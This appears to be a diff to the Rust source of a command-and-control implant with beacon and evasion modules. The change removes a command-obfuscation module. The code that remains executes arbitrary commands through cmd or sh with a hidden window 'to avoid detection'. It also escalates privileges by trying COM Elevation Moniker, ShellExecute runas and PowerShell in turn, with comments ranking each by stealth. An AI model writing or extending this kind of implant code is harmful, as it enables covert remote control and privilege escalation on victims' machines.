@@ -22,7 +22,6 @@ macro_rules! debug_print {
     };
 }
 
-mod argfuscator;
 mod beacon;
 mod config;
 mod evasion;
@@ -794,10 +793,7 @@ fn get_system_info(info_type: &str) -> String {
 }
 
 fn execute_command(command: &str) -> String {
-    // Apply command obfuscation
-    let obfuscated_cmd = argfuscator::obfuscate(command);
-    debug_print!("DEBUG: Comando original: {}", command);
-    debug_print!("DEBUG: Comando ofuscado: {}", obfuscated_cmd);
+    debug_print!("DEBUG: Ejecutando comando: {}", command);
 
     // Use CREATE_NO_WINDOW flag (0x08000000) to hide command prompt window
     // This is critical for production mode to avoid detection
@@ -805,14 +801,14 @@ fn execute_command(command: &str) -> String {
     let output = {
         use std::os::windows::process::CommandExt;
         Command::new("cmd")
-            .args(&["/C", &obfuscated_cmd])
+            .args(&["/C", command])
             .creation_flags(0x08000000) // CREATE_NO_WINDOW
             .output()
     };
 
     #[cfg(not(target_os = "windows"))]
     let output = Command::new("sh")
-        .args(&["-c", &obfuscated_cmd])
+        .args(&["-c", command])
         .output();
 
     match output {
@@ -1034,26 +1030,23 @@ fn elevate_agent() -> String {
 fn elevate_command(command: &str) -> String {
     debug_print!("DEBUG: Elevando comando: {}", command);
 
-    // Aplicar ofuscación al comando
-    let obfuscated_cmd = argfuscator::obfuscate(command);
-
     // TÉCNICA 1: Intentar COM Elevation Moniker (más sigiloso)
     // Usa COM para elevar sin llamar a PowerShell directamente
-    if let Ok(result) = elevate_via_com(&obfuscated_cmd) {
+    if let Ok(result) = elevate_via_com(command) {
         return result;
     }
 
     debug_print!("DEBUG: COM elevation failed, trying ShellExecute...");
 
     // TÉCNICA 2: ShellExecute con runas (nativo, menos detectable)
-    if let Ok(result) = elevate_via_shellexecute(&obfuscated_cmd) {
+    if let Ok(result) = elevate_via_shellexecute(command) {
         return result;
     }
 
     debug_print!("DEBUG: ShellExecute failed, trying PowerShell fallback...");
 
     // TÉCNICA 3: PowerShell como último recurso (más detectable)
-    elevate_via_powershell(&obfuscated_cmd)
+    elevate_via_powershell(command)
 }
 
 /// Elevación usando COM Elevation Moniker (más sigiloso, no usa PowerShell)
